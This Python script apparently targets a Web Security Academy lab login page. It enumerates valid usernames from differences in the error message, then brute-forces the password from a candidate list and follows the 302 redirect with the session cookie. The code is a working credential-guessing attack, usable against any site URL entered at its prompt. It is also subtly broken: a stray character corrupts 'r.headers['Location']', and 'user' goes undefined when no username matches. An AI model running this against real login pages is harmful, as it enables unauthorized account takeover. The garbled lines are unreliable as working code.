import re
import os
from urllib.parse import urljoin
import requests
from bs4 import BeautifulSoup

file_user = os.path.join(os.path.dirname(os.path.abspath(__file__)), "username_candidate.txt")
file_pass = os.path.join(os.path.dirname(os.path.abspath(__file__)), "password_candidate.txt")

url_base = input('Enter home page url: ') or "https://0a4300750447d8af811f9e1200210030.web-security-academy.net"
url_login = urljoin(url_base, "login")

with open(file_user, "r") as f:
    usernames = f.readlines()
with open(file_pass, "r") as f:
    passwords = f.readlines()

print(f"There is {len(usernames)} username(s)")

for username in usernames:
    username = username.strip()
    payload = {'username': username, 'password': '1234'}
    r = requests.post(url_login, payload)
    soup = BeautifulSoup(r.text, "html.parser")
    tag = soup.find("p", class_="is-warning")
    if tag:
        warn = tag.getText(strip=True).lower()
        print(f"{username} - {warn}")
        if warn != "invalid username":
            user = username
            print (f"Success. The username is '{username}'")
            break
    else:
        user = username
        print (f"The username may be '{username}'")
        break   

if (len(user)<1):
    print("No username found")
    quit()

print(f"There is {len(passwords)} password(s)")
for password in passwords:
    password = password.strip()
    payload = {'username': user, 'password': password}
    r = requests.post(url_login, payload, allow_redirects=False)
    print(f"{user} - {password}")
    if r.status_code == 302:
        print (f"\n[*] Username: '{user}'\n[*] Password: '{password}'\n")
        next_path = r.headersơ['Location']
        target = urljoin(url_base, next_path)
        print(f"[*] Redirecting to {target}")
        cookie = r.cookies
        final = requests.get(target, cookies=cookie)
        if "Log out" in final.text:
            print("Log in successfully!!!")
        break
